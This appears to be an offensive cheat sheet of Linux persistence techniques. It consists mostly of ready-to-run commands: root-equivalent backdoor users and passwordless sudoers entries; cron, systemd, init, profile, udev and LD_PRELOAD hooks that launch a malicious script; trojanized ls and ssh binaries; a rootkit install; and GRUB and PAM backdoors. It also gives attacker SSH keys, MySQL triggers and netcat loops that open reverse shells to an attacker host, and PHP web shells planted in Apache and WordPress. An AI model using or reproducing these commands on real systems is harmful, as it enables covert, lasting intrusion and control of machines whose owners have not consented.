# User Accounts

#### Create New User
- **Create New User with a Home Directory:**
	```bash
	sudo useradd -m -s /bin/bash <username>
	```
- **Set Password for New User:**
	```bash
	sudo passwd <username>
	```

#### Create Root User
- **Create New Root User:**
	```bash
	useradd -ou 0 -g 0 <username>
	passwd <username>
	```

#### Create New User with Sudo Privileges
- **Create New User with Sudo Privileges:**
	```bash
	sudo useradd -m -G sudo -s /bin/bash <username>
	sudo passwd <username>
	```
- **Add New User with a Specific UID:**
	```bash
	sudo useradd -u 0 -o -g 0 -G 0 -M -d /root -s /bin/bash <username>
	sudo passwd <username>
	```

#### Add User to Groups
- **Add User to Sudo Group:**
	```bash
	sudo usermod -aG sudo <username>
	```
- **Add User to Sudoers:** Adds user to the sudoers file without requiring a password
	```bash
	echo "<username> ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
	```

#### Change User Login Shell
- **Change User Login Shell**
	```bash
	sudo chsh -s /bin/bash <username>
	```

#### Modify User Password Hash
- **Modify User Password Hash:**
	```bash
	echo "<username>:<password_hash>" | sudo chpasswd -e
	```

#### Set Root Passwords
- **Change Root Password:** If compromised.
	```bash
	echo "root:<new_password>" | sudo chpasswd
	```

# Cron Job Persistence
Cron jobs allow tasks to run automatically at scheduled intervals. Modifying or creating new cron jobs for persistence can ensure that malicious scripts or commands execute at regular intervals or system boot.

#### View Cron Jobs
- **View Existing Cron Jobs**
	- `crontab -l`: Lists cron jobs for the current user.
	- `ls /etc/cron.*`: Lists hourly, daily, weekly, and monthly cron jobs.
	- `cat /etc/crontab`: Displays the system-wide cron jobs.
	- `cat /var/spool/cron/crontabs/*`: Lists cron jobs for all users (requires root).

#### Add Persistent Cron Jobs
- **Create User Cron Job:**
	```bash
	(crontab -l 2>/dev/null; echo "@reboot /path/to/malicious_script.sh") | crontab -
	```
- **Create Root Cron Job:**
	```bash
	sudo bash -c 'echo "@reboot /path/to/malicious_script.sh" >> /etc/crontab'
	```
- **Schedule Cron Job, Run Every Minute:**
	```bash
	(crontab -l 2>/dev/null; echo "* * * * * /path/to/malicious_script.sh") | crontab -
	```
- **Schedule Cron Job, Run Every 5 Minutes, Executing a Script:**
	```bash
	echo "*/5 * * * * /path/to/malicious_script.sh" | crontab -
	```
- **Schedule Cron Job, Run Every System Reboot for Current User:**
	```bash
	echo "@reboot /path/to/malicious_script.sh" | crontab -
	```

#### Modify System Cron Jobs
- **Create System-Wide Cron Jobs, Run Every System Reboot:**
	```bash
	echo "@reboot /path/to/malicious_script" >> /etc/crontab
	echo "@reboot /path/to/malicious_script" >> /etc/cron.d/root_job
	```
- **Inject Code into `/etc/cron.daily`:**
	```bash
	sudo bash -c 'echo "/path/to/malicious_script.sh" > /etc/cron.daily/malicious_script'
	sudo chmod +x /etc/cron.daily/malicious_script
	```

# Scheduled Job Persistence Using `at` Command

#### Use `at` for Scheduled Persistence
- **List All Scheduled `at` Jobs:**
	```bash
	atq
	```
- **Schedule One-Time Task Using `at`:**
	```bash
	echo "/path/to/malicious_script.sh" | at now + 1 minute
	```

#### Use `anacron` for Persistence
- **Create Daily Persistent Task with `anacron`:**
	```bash
	sudo bash -c 'echo "1 5 persistent_task /path/to/malicious_script.sh" >> /etc/anacrontab'
	```

# Bash Profile/RC Persistence
Bash profile files (`~/.bash_profile`, `~/.bashrc`, `~/.profile`) execute commands every time a user logs in. Modifying these files with malicious commands ensures persistence whenever the user logs into their shell.

#### Add Script to `/etc/profile`
- **Add Script to `/etc/profile`:**
	```cypher
	echo "/path/to/malicious_script" >> /etc/profile
	sudo bash -c 'echo "/path/to/malicious_script.sh" >> /etc/profile
	```

#### Add Script to `/etc/profile.d/`
- **Add a Script to `/etc/profile.d/`:**
	```bash
	sudo bash -c 'echo "/path/to/malicious_script.sh" > /etc/profile.d/persistent.sh'
	sudo chmod +x /etc/profile.d/persistent.sh
	```

#### Add Script to `.bashrc` (for a specific user)
- **Add Script to User `.bashrc`, Execute Every Shell Start:**
	```cypher
	echo "/path/to/malicious_script" >> /home/<username>/.bashrc
	```
- **Add Script to Root `.bashrc`, Execute Every Shell Start:** Requires root privileges
	```bash
	echo "/path/to/malicious_script.sh" >> /root/.bashrc
	```

#### Modify User Login Script
- **Add Script to `.bash_profile`:**
	```cypher
	echo "/path/to/malicious_script.sh" >> ~/.bash_profile
	```

#### Add Script to `/etc/bash.bashrc`
- **Add Script to `/etc/bash.bashrc` to execute the command for every user:**
	```cypher
	echo "/path/to/malicious_script.sh" >> ~/etc/bash.bashrc
	```

#### Add Script to `.bash_logout`
- **Add Script to `.bash_logout` to execute the command on log out:**
	```bash
	echo "/path/to/malicious_script" >> /home/<username>/.bash_logout
	```

# `rc.local` Persistence (Startup Scripts)
The `/etc/rc.local` script runs commands at startup before users log in. Injecting malicious commands into this script can ensure persistence after a reboot.

#### View `rc.local`
- **View `rc.local`:** Check if the system executes commands from this file.
	```bash
	cat /etc/rc.local
	```

#### Add Persistent Commands
- **Add Script to `/etc/rc.local`:**
	```bash
	echo "/path/to/malicious_script &" >> /etc/rc.local
	```
- **Or:**
	```bash
	sudo bash -c 'echo "/path/to/malicious_script.sh &" >> /etc/rc.local'
	chmod +x /etc/rc.local
	```

# Environmental Variable Persistence

#### Alias Command Persistence
Attackers can create persistent aliases in the shell configuration files (e.g., `.bashrc`, `.zshrc`).
- **Create an Alias for a Common Command:** Executes a malicious script every time the user runs `ls`.
	```bash
	echo "alias ls='ls --color=auto; /path/to/malicious_script'" >> /home/<username>/.bashrc
	```

#### Add Malicious Path to `$PATH`
- **Add Malicious Path to `$PATH`:**
	```bash
	export PATH=/path/to/malicious:$PATH
	```
- **Or:**
	```bash
	echo 'export PATH="/path/to/malicious:$PATH"' >> ~/.bashrc
	```

# Library Injection Persistence

#### Create a Malicious Shared Library
- **Create a Malicious Shared Library:**
	```bash
	#include <stdio.h>
	static void _init() {
	    system("/path/to/malicious_script.sh");
	}
	```
- **Compile the shared library:**
	```bash
	gcc -fPIC -shared -o malicious.so malicious.c -ldl
	```
- **Set Malicious Variable:**
	```bash
	echo "export <variable_name>=/path/to/malicious_library.so" >> ~/.bashrc
	```

#### Using `LD_PRELOAD`
`LD_PRELOAD` is an environment variable that allows shared libraries to be loaded before any others. Attackers can use it to inject malicious libraries for persistence.

- **Set `LD_PRELOAD`:** Loads the malicious shared library for all users.
	```bash
	echo "export LD_PRELOAD=/path/to/malicious.so" >> /etc/profile
	```

#### Using `LD_LIBRARY_PATH`
Modifying the `LD_LIBRARY_PATH` environment variable allows an attacker to redirect the loading of dynamic libraries to malicious ones without needing to modify system binaries.
 
- **Set `LD_LIBRARY_PATH` for User Sessions:** Redirects the dynamic linker to use the attacker’s malicious library during session initiation.
	```bash
	echo "export LD_LIBRARY_PATH=/path/to/malicious_lib" >> ~/.bashrc
	```
- **System-Wide Hijack:** Add the environment variable to `/etc/environment` or `/etc/profile` to affect all users.
	```bash
	echo "export LD_LIBRARY_PATH=/path/to/malicious_lib" >> /etc/environment
	```

#### Using `.bash_profile`
- **Set Malicious Environmental Variable in `.bash_profile`:**
	```bash
	echo "export MALICIOUS_VAR=/path/to/malicious_script" >> /home/<username>/.bash_profile
	```

# Trojanized System Binary Persistence
Replacing or modifying critical system binaries with malicious versions can provide persistence as the binary is executed frequently by legitimate users and processes.

#### Overwrite a System Binary
- **Replace a legitimate binary with a malicious one:**
	```bash
	cp /path/to/malicious_binary /usr/bin/legitimate_binary
	```
- **Ensure the malicious binary is executable:**
	```bash
	chmod +x /usr/bin/legitimate_binary
	```
- **Backdoor a Commonly Used Binary:**
	```bash
	sudo mv /bin/ls /bin/ls.bak
	echo -e '#!/bin/bash\n/path/to/malicious_script.sh\n/bin/ls.bak "$@"' | sudo tee /bin/ls
	sudo chmod +x /bin/ls
	```
- **Replace a System Utility with a Backdoored Version:**
	```bash
	sudo mv /usr/bin/ssh /usr/bin/ssh.bak
	echo -e '#!/bin/bash\n/path/to/malicious_script.sh\n/usr/bin/ssh.bak "$@"' | sudo tee /usr/bin/ssh
	sudo chmod +x /usr/bin/ssh
	```

#### Persistence via File System Modifications
- **Modify File Permissions to Maintain Access:**
	```bash
	sudo chattr +i /path/to/important_file
	```
- **Create Immutable Files for Persistence:**
	```bash
	sudo chattr +i /path/to/persistent_script.sh
	```

# Systemd Service Persistence
Modern Linux distributions use `systemd` to manage services, including those that start at boot. Attackers can create or modify `systemd` services to achieve persistence.

#### Create Persistent Systemd Service
- **Create Persistent Systemd Service:**
	```bash
	nano /etc/systemd/system/persistent.service
	```
- **Example content:**
	```bash
	sudo bash -c 'cat << EOF > /etc/systemd/system/persistent.service
	[Unit]
	Description=Persistent Backdoor
	
	[Service]
	ExecStart=/bin/bash -c "/path/to/malicious_script.sh"
	Restart=always
	
	[Install]
	WantedBy=multi-user.target
	EOF'
	sudo systemctl enable persistent.service
	sudo systemctl start persistent.service
	```
- **Or** :
	```bash
	echo "[Unit]
	Description=Malicious Service
	
	[Service]
	ExecStart=/path/to/malicious_script
	
	[Install]
	WantedBy=multi-user.target" | sudo tee /etc/systemd/system/malicious.service
	sudo systemctl enable malicious.service
	sudo systemctl start malicious.service
	```

#### Enable Service to Start on Boot
- **Enable Service to Start at Boot:**
	```bash
	systemctl enable persistent.service
	```
 - **Start Service immediately:**
	```bash
	systemctl start persistent.service
	```

# System Boot Script Persistence
The `init` system (on systems that don't use `systemd`) is responsible for bootstrapping the Linux environment. Modifying system boot scripts like `/etc/init.d/`, `/etc/rc.d/`, or `/etc/rc.local` ensures that malicious scripts run on system startup.

#### Create Custom `init.d` Script
- **Create Custom Init Script:**
	```bash
	sudo cp /path/to/malicious_script.sh /etc/init.d/
	sudo chmod +x /etc/init.d/malicious_script.sh
	sudo update-rc.d malicious_script.sh defaults
	```

#### Inject into `init.d`
- **Link a malicious script to `init.d`, enabling it to run at boot:**
	```bash
	ln -s /path/to/malicious_script.sh /etc/init.d/malicious
	```
- **Configure the script to start automatically during system boot:**
	```bash
	update-rc.d malicious defaults
	```

#### Create Service Using `init.d` (Legacy)
- **Create Service Using `init.d` (Legacy):**
	```bash
	sudo cp malicious_script.sh /etc/init.d/
	sudo chmod +x /etc/init.d/malicious_script.sh
	sudo update-rc.d malicious_script.sh defaults
	sudo service malicious_script.sh start
	```

#### Modify Existing Service Using `init.d` (Legacy)
- **Modify Existing Service Using `init.d` (Legacy):**
	```bash
	sudo systemctl edit <target_service>
	# Add malicious commands to be executed by the service
	```

#### `init` Hijacking
- **Hijack System Init:** Modify the `inittab` file to include malicious commands.
	```bash
	nano /etc/inittab
	```
	- **Example entry:**
	    ```bash
	    id:5:initdefault:
	    si::sysinit:/path/to/malicious_script.sh
	    ```

# Kernel Module Persistence
Attackers can maintain persistence by loading malicious kernel modules.

#### Load Malicious Kernel Module
- **Load Malicious Kernel Module:**
	```bash
	sudo insmod /path/to/malicious_module.ko
	```

#### Make Kernel Module Persistent
- **Make Kernel Module Persistent:**
	```bash
	echo "/path/to/malicious_module.ko" >> /etc/modules
	```

#### Rootkit Installation
- **Install a Simple Rootkit:**
	```bash
	sudo apt-get install -y linux-headers-$(uname -r)
	git clone https://github.com/m0nad/Diamorphine
	cd Diamorphine
	make
	sudo insmod diamorphine.ko
	```

# Bootloader Persistence (Grub)
By modifying the GRUB bootloader configuration, attackers can achieve persistence and even control how the system boots, possibly disabling security features like SELinux or AppArmor.

#### Modify GRUB Configuration
- **Modify GRUB options:**
	```bash
	nano /etc/default/grub
	```
    - **Example modification to disable SELinux:**
      ```bash
      GRUB_CMDLINE_LINUX_DEFAULT="quiet selinux=0"
      ```

#### Update GRUB Configuration
- **Apply the new configuration:**
	```bash
	update-grub
	```

#### Create a Backdoor Boot Option
- **Add a custom kernel boot option that loads a malicious rootkit or backdoor:**
	```bash
	nano /boot/grub/grub.cfg
	```

	```bash
	menuentry 'Backdoor Linux' {
		set root='hd0,msdos1'
		linux /boot/vmlinuz root=/dev/sda1 rw init=/bin/bash
	}
	```

#### GRUB Backdoor
- **GRUB Backdoor:**
	```bash
	sudo sed -i 's/quiet splash/quiet splash init=/bin/bash/' /etc/default/grub
	sudo update-grub
	```

# SSH Persistence

## SSH Key Persistence
Attackers can inject their public SSH keys into authorized keys files to enable persistent access without needing credentials.

#### Add SSH Keys for Persistence
- **Add SSH Key to Current User `authorized_keys`:**
	```bash
	echo "<attacker_public_key>" >> ~/.ssh/authorized_keys
	```
- **Add SSH Key to Root `authorized_keys`:** Requires Root Permissions
	```bash
	echo "<attacker_public_key>" >> /root/.ssh/authorized_keys
	```

#### Add SSH Key System-Wide
- **Add SSH Key to `sshd_config`:** Requires Root Permissions
	```bash
	echo "attacker_ssh_public_key" >> /etc/ssh/sshd_config
	```

## SSH Configuration Persistence
Attackers can modify the SSH server configuration to allow unauthorized access.

#### Allow Root Login via SSH
- **Enable SSH Root Login:**
	```bash
	sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
	service ssh restart
	```

#### Allow Password Authentication via SSH
- **Enables password authentication for SSH access:**  
	```bash
	sed -i 's/#PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
	service ssh restart
	```

#### Allow Specific User via SSH
- **Modify SSH Configuration to `sshd_config`:** 
	```bash
	echo 'AllowUsers <username>' >> /etc/ssh/sshd_config
	service ssh restart
	```

#### Add Script in `.ssh/authorized_keys`
- **Add Persistent Script `authorized_keys:**
	```c
	echo 'command="/path/to/malicious_script.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> ~/.ssh/authorized_keys
	chmod 600 ~/.ssh/authorized_keys
	```

#### Add Script in `.ssh/config`
- **Add Script in `.ssh/config`:** Executes a local script whenever an SSH connection is made.
	```bash
	echo "Host * \n PermitLocalCommand yes \n LocalCommand /path/to/malicious_script.sh" >> ~/.ssh/config
	```

# Database-Based Persistence

#### SQL Backdoors
- **Create a Malicious MySQL User:**
	```sql
	CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password';
	GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
	```
- **Create a Persistent MySQL Procedure:**
	```sql
	DELIMITER //
	CREATE PROCEDURE persist_shell() 
	BEGIN 
	    DECLARE cmd CHAR(255); 
	    SET cmd='nc -e /bin/bash <attacker_ip> <attacker_port>';
	    DO SYSTEM(cmd); 
	END //
	DELIMITER ;
	```

#### Persistent SQL Triggers
- **Create a Trigger to Execute a Backdoor Command:**
	```sql
	CREATE TRIGGER my_trigger 
	BEFORE INSERT ON users 
	FOR EACH ROW 
	BEGIN 
	    DECLARE cmd CHAR(255); 
	    SET cmd='nc -e /bin/bash <attacker_ip> <attacker_port>'; 
	    DO SYSTEM(cmd); 
	END;
	```

# Network-Based Persistence

## Persistent Shells

#### Bind Shell Persistence
- **Create a Bind Shell Using Netcat:**
	```bash
	while true; do nc -lp <attack_port> -e /bin/bash; sleep 60; done &
	```

#### Reverse Shell Persistence
- **Create a Reverse Shell Using Netcat:**
	```bash
	nohup nc -e /bin/bash <attacker_ip> <attacker_port> &
	```
- **Or:**
	```bash
	echo "while true; do nc -e /bin/bash <attacker_ip> <attacker_port>; sleep 60; done" > ~/persistent_reverse.sh
	chmod +x ~/persistent_reverse.sh
	nohup ~/persistent_reverse.sh &
	```

## Web Shells

#### Leveraging Web Shells
- **Upload a Simple PHP Web Shell:**
	```php
	<?php system($_GET['cmd']); ?>
	```
- **Invoke Commands via Web Shell:**
	```bash
	curl "http://target.com/shell.php?cmd=id"
	```
- **Create a Persistent Web Shell Listener:**
	```bash
	while true; do curl "http://target.com/shell.php?cmd=nc -e /bin/bash <attacker_ip> <attacker_port>"; sleep 60; done
	```

#### Modifying Web Server Configuration
- **Add a Backdoor to Apache Configuration:**
	```bash
	sudo bash -c 'echo "Include /var/www/html/.htaccess" >> /etc/apache2/apache2.conf'
	echo "AddType application/x-httpd-php .php" > /var/www/html/.htaccess
	echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/shell.php
	```
- **Inject Malicious Code in `.htaccess`:**
	```bash
	echo "RewriteEngine On" > /var/www/html/.htaccess
	echo "RewriteRule ^shell$ /var/www/html/shell.php [L]" >> /var/www/html/.htaccess
	```

#### Persistent Backdoors in Web Applications
- **Backdoor a WordPress Plugin:**
	```bash
	echo "<?php system(\$_GET['cmd']); ?>" >> /var/www/html/wp-content/plugins/plugin_name/plugin.php
	```
- **Create a Malicious WordPress Theme Function:**
	```bash
	echo "<?php exec(\$_GET['cmd']); ?>" >> /var/www/html/wp-content/themes/theme_name/functions.php
	```

## `resolv.conf` Persistence
An attacker can modify `/etc/resolv.conf` to redirect DNS queries to a malicious server, allowing for DNS-based persistence and control over the victim’s network communications.

#### Modify `resolv.conf`
- **Add a malicious DNS server:**
	```bash
	echo "nameserver <malicious_dns_ip>" >> /etc/resolv.conf
	```
  
#### Make the Change Persistent
- Use a cron job to continuously update `/etc/resolv.conf` in case it is overwritten by system services:
	```bash
	echo "*/5 * * * * echo 'nameserver <malicious_dns_ip>' >> /etc/resolv.conf" | crontab -
	```

## Port Knocking
Port knocking is a technique where a specific sequence of network packets ("knocks") is sent to a closed port to open a specific service.

#### Configure Port Knocking
- Use tools like `knockd` to configure port knocking to hide services such as an SSH backdoor.
- Example `/etc/knockd.conf`:
    ```bash
    [openSSH]
    sequence = 7000,8000,9000
    seq_timeout = 5
    command = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags = syn
    ```

# Miscellaneous Persistence

## PAM (Pluggable Authentication Modules) Persistence
PAM handles authentication on many Linux systems. By modifying PAM configurations or modules, an attacker can maintain persistent access by injecting custom authentication routines.

#### Backdoor PAM Module
- **Edit the PAM SSH configuration file to include a malicious authentication module:**
	```bash
	nano /etc/pam.d/sshd
	```
- **Add a malicious line to the configuration:**
    ```bash
    auth required /lib/security/malicious_pam.so
    ```

#### Create a Custom PAM Module
- **Write and compile the custom module then load it into the system:**
	```bash
	gcc -fPIC -shared -o malicious_pam.so malicious_pam.c -lpam
	mv malicious_pam.so /lib/security/
	```

## X11 Persistence (Desktop Environments)
In systems with a graphical user interface (GUI), attackers can modify X11 startup scripts to launch malicious processes whenever the user logs into the GUI.

#### Modify X11 Startup Scripts
- **Add malicious commands to the X11 initialization file:**
	```bash
	nano ~/.xinitrc
	```
- **Add commands that execute whenever an X session starts:**
	```bash
	nano ~/.xsession
	```
- **Example:**
    ```bash
    /path/to/malicious_script.sh &
    exec /usr/bin/startxfce4
    ```

#### Global Configuration
- **Modify the global X11 initialization script to affect all users:**
	```bash
	nano /etc/X11/xinit/xinitrc
	```

## Usermode Linux (UML) Persistence
By creating a "hidden" instance of User-mode Linux (UML), attackers can run another Linux kernel in user space, which can be leveraged for persistence.

#### Install and Configure UML
- **Set up a User-mode Linux instance:**
	```bash
	apt-get install user-mode-linux
	```
- **Create a UML filesystem and kernel image**.

#### Launch UML on System Boot
- **Add a startup command in `/etc/rc.local` to launch the UML environment at boot:**
	```bash
	echo "/usr/bin/linux /path/to/uml_filesystem.img" >> /etc/rc.local
	```

## `swapoff` Persistence
The Linux swap space is used as additional RAM. Attackers can hide malicious payloads in swap and reload them after reboots.

#### Inject into Swap
- **Create a new swap space and inject data:**
	```bash
	mkswap /dev/sda2
	```
  - **Enable swap space:**
	```bash
	swapon /dev/sda2
	```

#### Persistent Swap Manipulation
- **Use a cron job or startup script to ensure the malicious swap space is re-enabled:**
	```bash
	echo "swapon /dev/sda2" >> /etc/rc.local
	```

## Udev Rule Persistence
The `udev` system is used to manage hardware events. Attackers can modify `udev` rules to trigger malicious actions whenever specific hardware is detected.

#### Create Malicious Udev Rule
- **Add a rule to execute a script when a USB device is connected:**
	```bash
	nano /etc/udev/rules.d/99-malicous.rules
	```
- **Example rule:**
    ```bash
    ACTION=="add", SUBSYSTEM=="usb", RUN+="/path/to/malicious_script.sh"
    ```

#### Reload Udev Rules
- **Reload the modified udev rules:**
	```bash
	udevadm control --reload
	```

## `/dev/shm` Persistence (Shared Memory)
Shared memory (`/dev/shm`) is often overlooked by administrators. Attackers can store malicious scripts or binaries here and execute them periodically.

#### Store Payload in `/dev/shm`
- **Place a backdoor in shared memory:**
	```bash
	cp /path/to/malicious_binary /dev/shm/malicious
	```

#### Execute Malicious Script from `/dev/shm`
- Add a cron job or systemd service that runs the binary stored in `/dev/shm`:
	```bash
	echo "* * * * * /dev/shm/malicious" | crontab -
	```
